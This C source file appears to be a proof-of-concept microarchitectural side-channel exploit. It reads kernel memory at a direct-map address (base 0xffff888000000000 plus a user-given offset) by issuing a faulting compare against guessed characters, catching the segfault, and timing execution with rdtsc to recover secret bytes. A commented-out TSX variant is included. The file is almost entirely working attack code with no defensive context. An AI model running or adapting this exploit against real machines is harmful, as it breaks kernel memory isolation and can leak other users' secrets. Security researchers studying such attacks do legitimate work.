#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>

#define FROM 'A'
#define TO 'Z'

static jmp_buf jbuf;

uint64_t start_time, spend_time;
static int hist[256];

static __attribute__((always_inline)) inline uint64_t rdtsc()
{
    uint64_t a, d;
    asm volatile("mfence");
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static void unblock_signal(int signum __attribute__((__unused__)))
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum)
{
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(jbuf, 1);
}

static __attribute__((always_inline)) inline unsigned int xbegin(void)
{
    int ret = (~0u);
    asm volatile(".byte 0xc7,0xf8 ; .long 0"
                 : "+a"(ret)::"memory");
    return ret;
}

int main(int argc, char *argv[])
{
    unsigned char test_num, result_num;
    size_t secret, len = 10;
    uint64_t result_time;
    int i, size, max_i, max_i_index;

    secret = strtoull(argv[1], NULL, 0);
    secret += 0xffff888000000000;
    if (argc > 2)
    {
        len = atoi(argv[2]);
    }

    signal(SIGSEGV, segfault_handler);
    for (size = 0; size < len; size++)
    {
        for (i = FROM; i < TO; i++)
            hist[i] = 0;

        for (i = 0; i < 3000; i++)
        {
            result_time = 0;
            for (test_num = FROM; test_num < TO; test_num++)
            {
                spend_time = 0;
                start_time = rdtsc();
                if (!setjmp(jbuf))
                // if (xbegin() == (~0u))
                {
                    __asm__ __volatile__(
                        "mov %[cmp_value], %%rcx \n\t"
                        "mov %[test_num], %%al \n\t"

                        // Status Flags:
                        // ZF
                        // "cmpxchgb %%bl, (%%rcx)\n\t"
                        "cmp (%%rcx), %%al\n\t"
                        // "sub (%%rcx), %%al\n\t"
                        :
                        : [cmp_value] "r"(secret + size),
                          [test_num] "r"(test_num)
                        :);
                }
                asm volatile(
                    "jz equal \n\t"
                    // "je equal \n\t"
                    "jmp notequal\n\t"
                    "equal: nop \n\t");
                printf("equal, %d:%c\n", test_num, test_num);
                asm volatile(
                    "notequal: nop \n\t");
                spend_time = rdtsc() - start_time;

                if (result_time < spend_time)
                {
                    result_time = spend_time;
                    result_num = test_num;
                }
            }

            hist[result_num]++;
        }

        max_i = -1;
        for (i = FROM; i < TO; i++)
        {
            if (max_i < hist[i])
            {
                max_i = hist[i];
                max_i_index = i;
            }
        }

        printf("size: %d\n", size);
        printf("\t max_i: %d\n", max_i);
        printf("\t max_i_index: %c\n", max_i_index);
    }
}